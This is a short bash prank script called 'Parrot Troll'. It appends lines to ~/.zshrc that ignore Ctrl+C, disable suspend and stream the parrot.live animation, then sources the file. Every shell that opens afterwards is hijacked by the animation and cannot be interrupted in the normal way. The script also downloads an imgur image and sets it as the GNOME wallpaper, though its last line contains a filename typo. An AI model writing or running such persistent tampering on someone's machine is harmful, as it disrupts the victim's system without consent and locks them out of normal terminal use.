#!/bin/bash

PARROT_TROLL=$(cat << 'EOF'
trap '' 2
stty susp undef
curl parrot.live
EOF
)

append_parrot_troll() {
    local file="$1"
    if [ -f "$file" ]; then
		echo "$PARROT_TROLL" >> "$file"
		echo "Parrot Troll 🦜 added to $file"
    fi
}

append_parrot_troll ~/.zshrc
source ~/.zshrc
cd $HOME
curl -o Z.png https://imgur.com/fBOHS0k
gsettings set org.gnome.desktop.background picture-uri-dark $HOME/Z.png
gsettings set org.gnome.desktop.background picture-uri $HOME/Z.pngs
